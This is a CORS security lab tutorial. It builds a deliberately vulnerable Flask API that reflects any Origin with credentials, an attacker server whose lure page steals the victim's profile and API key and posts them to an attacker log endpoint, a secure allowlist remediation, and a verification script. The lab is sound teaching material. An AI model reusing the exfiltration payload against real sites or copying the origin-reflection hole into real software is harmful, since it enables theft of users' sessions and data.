---
title: "06 - Hands-On Lab: Exploiting and Remediating CORS"
description: "Step-by-step hands-on lab: build a vulnerable Flask API, execute a complete cross-origin data exfiltration exploit PoC, apply secure allowlist remediation, and verify with an automated test suite."
keywords: ["AppSec", "Hands-On Lab", "CORS Exploit", "Flask Security", "Data Exfiltration", "PoC", "Remediation", "Security Tutorial"]
---

# 06 - Hands-On Lab: Exploiting and Remediating CORS

This self-contained, hands-on lab provides a practical environment for exploiting and remediating a CORS origin reflection vulnerability.

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            HANDS-ON LAB ECOSYSTEM                           │
├─────────────────────────────────────────────────────────────────────────────┤
│ 1. Vulnerable API (vulnerable_server.py - http://localhost:5000)            │
│    Reflects incoming request Origin headers and enables credentials.       │
├─────────────────────────────────────────────────────────────────────────────┤
│ 2. Malicious Server (attacker_server.py - http://localhost:8000)             │
│    Hosts exploit.html exfiltration payload and records stolen tokens.       │
├─────────────────────────────────────────────────────────────────────────────┤
│ 3. Secure API (secure_server.py - http://localhost:5000)                   │
│    Remediated backend enforcing strict allowlists and Vary: Origin headers. │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites & Dependencies

Ensure Python 3 is installed, then install required packages:

```bash
pip install flask flask-cors requests
```

---

## Part 1: The Vulnerable API (`vulnerable_server.py`)

Create `vulnerable_server.py`. This server represents a sensitive microservice that improperly reflects any client-supplied `Origin` header while enabling `Access-Control-Allow-Credentials: true`.

```python
#!/usr/bin/env python3
"""
VULNERABLE API SERVER (vulnerable_server.py)
DO NOT USE IN PRODUCTION. FOR SECURITY TESTING ONLY.
"""
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

# Simulated user database
USER_DATABASE = {
    "user_id": 1001,
    "username": "victim_user",
    "email": "victim@corporate-enterprise.com",
    "api_key": "sec_live_998877665544332211_secret",
    "account_balance": "$125,400.00"
}

@app.route('/api/v1/user/profile', methods=['GET', 'OPTIONS'])
def get_user_profile():
    # Simulate session check (Cookie lookup)
    session_cookie = request.cookies.get('session_token')
    
    # Generate API JSON response
    response_data = jsonify(USER_DATABASE)
    response = make_response(response_data)
    
    # ❌ VULNERABLE LOGIC: Echoing incoming Origin header dynamically
    origin = request.headers.get('Origin')
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        
    return response

if __name__ == '__main__':
    print("[*] Starting Vulnerable API Server on http://localhost:5000...")
    app.run(host='0.0.0.0', port=5000, debug=False)
```

---

## Part 2: The Attacker Server & Exploit PoC (`attacker_server.py`)

Create `attacker_server.py`. This server hosts the malicious web page (`exploit.html`) on `http://localhost:8000` and logs stolen victim payloads.

```python
#!/usr/bin/env python3
"""
ATTACKER COMMAND & CONTROL SERVER (attacker_server.py)
Hosts exploit HTML payload and captures exfiltrated victim data.
"""
from flask import Flask, request, render_template_string, jsonify
from flask_cors import CORS
import datetime

app = Flask(__name__)
CORS(app) # Allow cross-origin submission of stolen logs to attacker server

stolen_data_log = []

EXPLOIT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Congratulations! You Won an iPhone!</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .stolen-box { background-color: #fee; border: 2px red solid; padding: 20px; width: 60%; margin: 20px auto; text-align: left; }
    </style>
</head>
<body>
    <h1>Claiming Reward...</h1>
    <p>Please wait while we verify your prize eligibility.</p>

    <div class="stolen-box">
        <h3>Stolen API Data (Live Output):</h3>
        <pre id="output">Exfiltrating data...</pre>
    </div>

    <script>
        const targetApiUrl = "http://localhost:5000/api/v1/user/profile";
        const attackerLogUrl = "http://localhost:8000/log-stolen-data";

        // Step 1: Execute cross-origin credentialed request to vulnerable API
        fetch(targetApiUrl, {
            method: "GET",
            credentials: "include" // Transmits victim's session cookies automatically
        })
        .then(response => {
            if (!response.ok) throw new Error("CORS or HTTP Error: " + response.status);
            return response.json();
        })
        .then(data => {
            // Display stolen data on attacker page
            document.getElementById("output").innerText = JSON.stringify(data, null, 2);
            
            // Step 2: Send stolen victim data to attacker server
            return fetch(attackerLogUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    victim_ip: "127.0.0.1",
                    exfiltrated_data: data,
                    timestamp: new Date().toISOString()
                })
            });
        })
        .catch(err => {
            document.getElementById("output").innerText = "EXPLOIT FAILED: " + err.message;
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(EXPLOIT_HTML)

@app.route('/log-stolen-data', methods=['POST'])
def log_stolen_data():
    payload = request.get_json()
    stolen_data_log.append(payload)
    print("\n" + "="*60)
    print(f"[!] SUCCESSFUL EXFILTRATION AT {payload.get('timestamp')}")
    print(f"Stolen Data: {payload.get('exfiltrated_data')}")
    print("="*60 + "\n")
    return jsonify({"status": "logged"})

if __name__ == '__main__':
    print("[*] Starting Attacker C2 Server on http://localhost:8000...")
    app.run(host='0.0.0.0', port=8000, debug=False)
```

---

## Part 3: Step-by-Step Lab Execution & Verification

### Step 1: Launch Servers
Open two terminal windows:
- **Terminal 1:** Run `python vulnerable_server.py`
- **Terminal 2:** Run `python attacker_server.py`

### Step 2: Simulate Victim Session
Open your web browser and navigate to `http://localhost:5000/api/v1/user/profile`. Notice the browser retrieves the profile JSON. Open Developer Tools -> Application -> Cookies, and create a test cookie: `session_token=secret_victim_cookie_123`.

### Step 3: Trigger Exploit
Navigate to the attacker's web page: `http://localhost:8000/`.

**Observation:**
1. The web browser sends an HTTP request from origin `http://localhost:8000` to target `http://localhost:5000`.
2. The vulnerable server echoes `Access-Control-Allow-Origin: http://localhost:8000` and `Access-Control-Allow-Credentials: true`.
3. The browser allows JavaScript on `http://localhost:8000` to read the sensitive profile data (`api_key`, `account_balance`).
4. Look at Terminal 2 (`attacker_server.py`). The console prints the exfiltrated API key and balance!

---

## Part 4: Secure Remediation (`secure_server.py`)

Create `secure_server.py`. This server remediates the vulnerability by enforcing a strict server-side origin allowlist and including `Vary: Origin`.

```python
#!/usr/bin/env python3
"""
REMEDIATED SECURE API SERVER (secure_server.py)
Enforces strict domain allowlisting and Vary: Origin headers.
"""
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)

# Strict Explicit Domain Allowlist (DO NOT INCLUDE localhost:8000!)
SECURE_ALLOWED_ORIGINS = [
    "http://localhost:3000",       # Approved Frontend Development Port
    "https://app.corporate.com"    # Production Frontend Domain
]

# Apply strict CORS configuration via official Flask-CORS middleware
CORS(app, resources={
    r"/api/*": {
        "origins": SECURE_ALLOWED_ORIGINS,
        "supports_credentials": True,
        "allow_headers": ["Content-Type", "Authorization"],
        "methods": ["GET", "POST", "OPTIONS"],
        "max_age": 600
    }
})

@app.after_request
def add_security_headers(response):
    # Mandatory header to prevent CDN cache poisoning
    response.headers['Vary'] = 'Origin'
    return response

USER_DATABASE = {
    "user_id": 1001,
    "username": "victim_user",
    "email": "victim@corporate-enterprise.com",
    "api_key": "sec_live_998877665544332211_secret",
    "account_balance": "$125,400.00"
}

@app.route('/api/v1/user/profile', methods=['GET'])
def get_user_profile():
    return jsonify(USER_DATABASE)

if __name__ == '__main__':
    print("[*] Starting Secure API Server on http://localhost:5000...")
    app.run(host='0.0.0.0', port=5000, debug=False)
```

---

## Part 5: Automated Exploitation Verification Script (`verify_fix.py`)

Save `verify_fix.py` and run it against both servers to verify remediation.

```python
#!/usr/bin/env python3
"""
CORS REMEDIATION VERIFICATION SUITE (verify_fix.py)
"""
import requests

TARGET_API = "http://localhost:5000/api/v1/user/profile"
UNAUTHORIZED_ORIGIN = "http://localhost:8000"

def test_cors_security():
    print(f"[*] Testing CORS Enforcement against {TARGET_API}...")
    headers = {"Origin": UNAUTHORIZED_ORIGIN}
    
    response = requests.get(TARGET_API, headers=headers)
    
    acao = response.headers.get("Access-Control-Allow-Origin")
    acac = response.headers.get("Access-Control-Allow-Credentials")
    vary = response.headers.get("Vary")
    
    print(f"  -> Origin Sent: {UNAUTHORIZED_ORIGIN}")
    print(f"  -> Returned ACAO: {acao}")
    print(f"  -> Returned ACAC: {acac}")
    print(f"  -> Returned Vary: {vary}")
    
    if acao == UNAUTHORIZED_ORIGIN:
        print("\n[❌ FAILED] Vulnerable! API reflected unauthorized origin.")
    else:
        print("\n[✅ PASSED] Secure! API blocked unauthorized origin reflection.")
        
    if vary and "Origin" in vary:
        print("[✅ PASSED] Secure! Vary: Origin header is properly configured.")
    else:
        print("[❌ FAILED] Warning: Missing Vary: Origin header.")

if __name__ == "__main__":
    test_cors_security()
```
